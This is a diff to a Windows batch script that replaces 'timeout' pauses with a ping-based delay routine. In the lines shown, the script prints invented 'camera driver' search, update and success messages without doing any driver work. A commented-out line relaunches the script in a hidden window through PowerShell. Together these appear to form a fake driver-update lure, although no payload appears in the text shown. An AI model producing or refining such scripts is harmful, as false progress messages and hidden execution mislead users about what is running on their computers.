@@ -2,12 +2,21 @@
 title Creating new Info
 setlocal enabledelayedexpansion
 
-timeout /t 4 /nobreak >nul
+call :delay 4
 echo [INFO] Searching for Camera Drivers ...
-timeout /t 4 /nobreak >nul
+call :delay 4
 echo [INFO] Update Driver Packages...
-timeout /t 4 /nobreak >nul
+call :delay 4
 echo [SUCCESS] Camera Driver Setup completed successfully.
+goto :skip_delay
+
+:delay
+REM Reliable delay in seconds (works when output is redirected); usage: call :delay 4
+set /a "pings=%~1+1"
+ping 127.0.0.1 -n !pings! -w 1000 >nul
+goto :eof
+
+:skip_delay
 
 :: if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
 
